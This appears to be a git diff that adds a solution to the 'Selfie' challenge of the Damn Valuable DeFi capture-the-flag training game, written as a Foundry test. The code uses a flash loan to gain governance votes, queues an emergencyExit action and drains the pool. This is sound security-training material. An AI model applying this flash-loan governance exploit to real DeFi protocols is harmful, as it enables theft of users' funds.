@@ -6,6 +6,7 @@ import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
 import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
+import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
 
 contract SelfieChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -62,7 +63,17 @@ contract SelfieChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_selfie() public checkSolvedByPlayer {
-        
+        MaliciousContract maliciousContract = new MaliciousContract(
+            pool,governance,token,recovery
+        );
+        pool.flashLoan(
+            IERC3156FlashBorrower(address(maliciousContract)),
+            address(token),
+            TOKENS_IN_POOL,
+            ""
+        );
+        skip(2 days);
+        governance.executeAction(maliciousContract.attackAuctionId());        
     }
 
     /**
@@ -73,4 +84,41 @@ contract SelfieChallenge is Test {
         assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
         assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
     }
+}
+
+contract MaliciousContract {
+    SelfiePool private immutable pool;
+    SimpleGovernance private immutable governance;
+    DamnValuableVotes private immutable dvt;
+    address private recovery;
+    uint256 public attackAuctionId;
+
+    constructor(SelfiePool _pool, SimpleGovernance _govern, DamnValuableVotes _token, address _recovery){
+        pool = _pool;
+        governance = _govern;
+        dvt = _token;
+        recovery = _recovery;
+    }
+
+    function onFlashLoan(
+        address initiator,
+        address token,
+        uint256 amount,
+        uint256 fee,
+        bytes calldata data
+    ) external returns (bytes32) {
+        DamnValuableVotes(token).delegate(address(this));
+        attackAuctionId = governance.queueAction(
+            address(pool),
+            0,
+            abi.encodeCall(
+                pool.emergencyExit,
+                recovery
+            )
+        );
+
+        dvt.approve(address(pool), type(uint256).max);
+        return keccak256("ERC3156FlashBorrower.onFlashLoan");
+    }
+
 }
